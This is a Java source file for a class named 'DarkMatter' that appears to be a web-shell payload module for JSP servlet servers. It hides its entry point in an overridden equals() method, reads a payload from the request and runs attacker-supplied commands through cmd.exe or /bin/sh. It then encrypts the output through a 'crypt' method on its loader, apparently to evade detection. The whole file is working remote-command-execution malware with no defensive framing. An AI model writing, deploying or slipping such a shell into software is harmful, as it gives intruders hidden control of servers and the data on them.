import javax.servlet.jsp.PageContext;
import javax.servlet.http.HttpServletRequest;
import java.io.*;
import java.util.HashMap;
import java.util.Map;
import java.util.*;

public class DarkMatter
{
    private Map<String, String> ParseParams(String paramStr)
    {
        Map<String, String> map = new HashMap<String,String>();
        if (paramStr == null || paramStr.trim().isEmpty())
            return map;

        String[] pairs = paramStr.split("&");
        for (String pair : pairs)
        {
            int nIdx = pair.indexOf("=");
            if (nIdx > 0)
            {
                map.put(pair.substring(0, nIdx), pair.substring(nIdx + 1));
            }
        }

        return map;
    }

    private byte[] Encrypt(Object objPageContext, byte[] abRawResponse)
    {
        try
        {
            ClassLoader loader = this.getClass().getClassLoader();
            java.lang.reflect.Method cryptMethod = loader.getClass().getMethod("crypt", byte[].class, int.class);
            byte[] abCipher = (byte[])cryptMethod.invoke(loader, abRawResponse, 1);

            return abCipher;
        }
        catch (Exception ex)
        {
            return abRawResponse;
        }
    }

    @Override
    public boolean equals(Object obj)
    {
        OutputStream os = null;
        try
        {
            PageContext pageContext = (PageContext)obj;
            HttpServletRequest request = (HttpServletRequest)pageContext.getRequest();

            os = pageContext.getResponse().getOutputStream();

            Object objPayload = request.getAttribute("payload");
            Object objLength = request.getAttribute("len");

            if (objPayload == null || objLength == null)
            {
                os.write("PAYLOAD_ERROR: Missing attributes from request.".getBytes());
                return true;
            }

            byte[] abPayload = (byte[])objPayload;
            int nClassLength = Integer.parseInt(objLength.toString());
            int nParamOffset = nClassLength + 4;
            int nParamLength = abPayload.length - nParamOffset;
            String szParam = new String(abPayload, nParamOffset, nParamLength, "UTF-8").trim();

            Map<String, String> params = ParseParams(szParam);
            String szAction = params.get("action");

            if (szAction.equals("CMD"))
            {
                String szCmd = params.get("cmd");
                if (szCmd == null)
                    return true;

                Process proc;
                String szOsName = System.getProperty("os.name").toLowerCase();
                if (szOsName.contains("win"))
                    proc = Runtime.getRuntime().exec(new String[] {"cmd.exe", "/c", szCmd});
                else
                    proc = Runtime.getRuntime().exec(new String[] {"/bin/sh", "-c", szCmd});

                InputStream is = proc.getInputStream();
                InputStream es = proc.getErrorStream();
                ByteArrayOutputStream bos = new ByteArrayOutputStream();

                byte[] abBuffer = new byte[1024];
                int nLength = 0;

                while ((nLength = is.read(abBuffer)) != -1)
                    bos.write(abBuffer, 0, nLength);

                while ((nLength = es.read(abBuffer)) != -1)
                    bos.write(abBuffer, 0, nLength);
                
                byte[] abResult = bos.toByteArray();
                if (abResult.length == 0)
                    abResult = "CMD_SUCCESS: Command executed but returned no output".getBytes();

                byte[] abEncryptedResult = Encrypt(null, abResult);
                os.write(abEncryptedResult);
                os.flush();

                try
                {
                    javax.servlet.http.HttpServletResponse response = (javax.servlet.http.HttpServletResponse)pageContext.getResponse();
                    response.setStatus(200);

                    pageContext.getOut().clear();
                    response.flushBuffer();
                }
                catch (Exception ex)
                {

                }

                return true;
            }
            else
            {
                os.write(("CMD_ERROR: Unknown action: " + szAction).getBytes());
            }
        }
        catch (Exception ex)
        {
            if (os != null)
            {
                try
                {
                    StringWriter sw = new StringWriter();
                    ex.printStackTrace(new PrintWriter(sw));
                    os.write(("CMD_INTERNAL_CRASHED: " + sw.toString()).getBytes());
                }
                catch (Exception e) {}
            }
        }

        return true;
    }
}
